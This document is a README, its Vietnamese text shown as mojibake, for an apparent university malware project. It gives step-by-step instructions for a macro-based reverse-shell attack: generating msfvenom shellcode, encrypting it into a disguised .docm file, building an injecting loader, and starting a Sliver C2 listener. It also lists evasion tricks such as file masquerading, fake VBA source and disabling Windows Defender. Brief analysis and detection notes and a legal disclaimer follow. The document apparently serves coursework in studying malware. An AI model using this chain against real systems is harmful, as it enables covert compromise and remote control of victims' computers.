# Malware Reverse Shell - Memory Injection v·ªõi AES-256-GCM
**NT230 - C∆° Ch·∫ø Ho·∫°t ƒê·ªông C·ªßa M√£ ƒê·ªôc - ƒê·ªì √Ån**

## üéØ Workflow

```
Word Document (BT6.docm) 
    ‚Üì
VBA Macro ch·∫°y khi m·ªü file
    ‚Üì
ƒê·ªïi t√™n BT6.docm ‚Üí ~temp.exe v√† th·ª±c thi
    ‚Üì
Loader (~temp.exe) ƒë·ªçc file BT7.docm
    ‚Üì
Gi·∫£i m√£ AES-256-GCM ‚Üí Shellcode
    ‚Üì
Memory Injection:
  - VirtualAlloc (RW)
  - memcpy shellcode
  - VirtualProtect (RX)
  - CreateThread
    ‚Üì
Shellcode th·ª±c thi ‚Üí Reverse Shell k·∫øt n·ªëi C2
```

## üìÅ C·∫•u tr√∫c Project

```
Malware_Revershell/
‚îú‚îÄ‚îÄ generate_shellcode.py    # T·∫°o shellcode (msfvenom/test)
‚îú‚îÄ‚îÄ listener.py               # C2 listener
‚îú‚îÄ‚îÄ loader/
‚îÇ   ‚îú‚îÄ‚îÄ src/
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ loader.c         # C loader: decrypt + inject
‚îÇ   ‚îú‚îÄ‚îÄ encryptor.py         # Encrypt shellcode AES-256-GCM
‚îÇ   ‚îî‚îÄ‚îÄ build.bat            # Build loader ‚Üí BT6.docm
‚îÇ
VBA_Code/
‚îú‚îÄ‚îÄ malicious_code.vba       # Macro: ƒë·ªïi t√™n + ch·∫°y loader
‚îî‚îÄ‚îÄ fake_source.vba          # Fake code ƒë·ªÉ bypass analysis
```

## üöÄ H∆∞·ªõng d·∫´n s·ª≠ d·ª•ng

### B∆∞·ªõc 1: T·∫°o Shellcode

```bash
# C·∫ßn c√†i Metasploit Framework
python generate_shellcode.py 192.168.1.100 4444
```
Output: `shellcode.bin`

### B∆∞·ªõc 2: M√£ h√≥a Shellcode

```bash
# Install dependencies
pip install cryptography

# Encrypt shellcode th√†nh BT7.docm
python loader\encryptor.py shellcode.bin BT7.docm
```

**L∆∞u √Ω:** Password m·∫∑c ƒë·ªãnh = `NT230_Group5_Key`
- Thay ƒë·ªïi trong [loader/encryptor.py](loader/encryptor.py) line 108
- C·∫≠p nh·∫≠t trong [loader/src/loader.c](loader/src/loader.c) line 23

### B∆∞·ªõc 3: Build Loader

```bash
cd loader
./build.bat
```

**Requirements:**
- MinGW-w64, ho·∫∑c

Output: `BT6.docm` (th·ª±c ch·∫•t l√† .exe)

### B∆∞·ªõc 4: T·∫°o Word Document v·ªõi Macro

1. T·∫°o Word document m·ªõi
2. Enable macros (Developer tab)
3. Copy code t·ª´ [VBA_Code/malicious_code.vba](../VBA_Code/malicious_code.vba)
4. L∆∞u document c√πng th∆∞ m·ª•c v·ªõi:
   - `BT6.docm` (loader exe)
   - `BT7.docm` (encrypted shellcode)

### B∆∞·ªõc 5: Ch·∫°y C2 Listener

```bash
sliver > mtls -L 192.168.1.100 -l 8443
```

### B∆∞·ªõc 6: Th·ª±c thi

1. M·ªü Word document
2. Enable macros khi ƒë∆∞·ª£c h·ªèi
3. Macro t·ª± ƒë·ªông:
   - ƒê·ªïi BT6.docm ‚Üí ~temp.exe
   - Ch·∫°y ~temp.exe
4. Loader gi·∫£i m√£ BT7.docm v√† inject shellcode
5. Reverse shell k·∫øt n·ªëi v·ªÅ C2

## üîê K·ªπ thu·∫≠t Bypass s·ª≠ d·ª•ng

### 1. VBA Obfuscation
- String encoding (DecodeString function)
- Hidden execution (`shell.Run ... 0`)
- Delay execution (Timer loop)

### 2. File Masquerading
- `.docm` extension cho executable files
- T√™n file gi·ªëng document

### 3. Encryption
- **AES-256-GCM** cho shellcode
- PBKDF2 key derivation
- Authentication tag ƒë·ªÉ ch·ªëng tampering

### 4. Memory-only Execution
- Kh√¥ng write shellcode ra disk
- VirtualAlloc ‚Üí Memory injection
- Ch·∫°y trong process space

### 5. Anti-Analysis
- Kh√¥ng hardcode string
- Fake VBA source ([fake_source.vba](../VBA_Code/fake_source.vba))
- VBA stomping compatible

### Bypass Windows Defender


1. **T·∫Øt Real-time Protection:**
   ```
   Settings ‚Üí Windows Security ‚Üí Virus & threat protection
   ‚Üí Real-time protection: Off
   ```

2. **Ho·∫∑c add exclusion:**
   ```
   ‚Üí Exclusions ‚Üí Add folder
   ‚Üí Ch·ªçn folder ch·ª©a project
   ```

## üìä Ph√¢n t√≠ch Malware

### Static Analysis

```bash
# Check PE headers
dumpbin /headers loader\BT6.docm

# Strings analysis
strings BT6.docm

# Import table
dumpbin /imports BT6.docm
```

S·∫Ω th·∫•y:
- `VirtualAlloc`, `VirtualProtect` ‚Üí Memory manipulation
- `BCrypt*` ‚Üí Encryption functions
- `CreateThread` ‚Üí Code injection

### Dynamic Analysis

```bash
# Process Monitor (Sysinternals)
procmon.exe

# API Monitor
apimonitor.exe

# Debugger
x64dbg BT6.docm
```

## üéì Educational Notes

### K·ªπ thu·∫≠t h·ªçc ƒë∆∞·ª£c:

1. **VBA Macro Malware**
   - Auto-execution (AutoOpen)
   - File manipulation
   - Process execution

2. **Cryptography**
   - AES-256-GCM symmetric encryption
   - PBKDF2 key derivation
   - Nonce v√† authentication tags

3. **Memory Injection**
   - VirtualAlloc/VirtualProtect
   - DEP bypass (RW ‚Üí RX)
   - Thread injection

4. **Evasion Techniques**
   - String obfuscation
   - File masquerading
   - Encrypted payload
   - Memory-only execution

### Detection Methods:

1. **Behavior-based:**
   - VBA executing external process
   - Memory allocation patterns
   - Network connections

2. **Signature-based:**
   - Known shellcode patterns
   - API call sequences
   - Encryption artifacts

## ‚ö†Ô∏è Legal Disclaimer

**CH·ªà S·ª¨ D·ª§NG CHO M·ª§C ƒê√çCH H·ªåC T·∫¨P V√Ä NGHI√äN C·ª®U**

- ƒê√¢y l√† ƒë·ªì √°n m√¥n h·ªçc NT230 - UIT
- Kh√¥ng s·ª≠ d·ª•ng cho m·ª•c ƒë√≠ch b·∫•t h·ª£p ph√°p
- Test trong m√¥i tr∆∞·ªùng c√¥ l·∫≠p/m√°y ·∫£o
- Tu√¢n th·ªß lu·∫≠t ph√°p v·ªÅ an ninh m·∫°ng

## üìö References

- [AES-GCM Encryption](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
- [Windows API Memory Injection](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/)
- [VBA Macro Security](https://docs.microsoft.com/en-us/deployoffice/security/internet-macros-blocked)
- [Metasploit Framework](https://www.metasploit.com/)

## üõ†Ô∏è Troubleshooting

**Loader kh√¥ng ch·∫°y:**
- Ki·ªÉm tra BT7.docm c√≥ t·ªìn t·∫°i
- Verify password trong loader.c v√† encryptor.py kh·ªõp nhau
- Check Windows Defender/antivirus

**Shellcode kh√¥ng k·∫øt n·ªëi:**
- Verify LHOST/LPORT ƒë√∫ng
- Check firewall
- ƒê·∫£m b·∫£o listener ƒëang ch·∫°y

**Build l·ªói:**
- Install MinGW ho·∫∑c Visual Studio
- Check bcrypt.lib c√≥ trong system

---

**Created for NT230 - UIT - Academic Purpose Only**
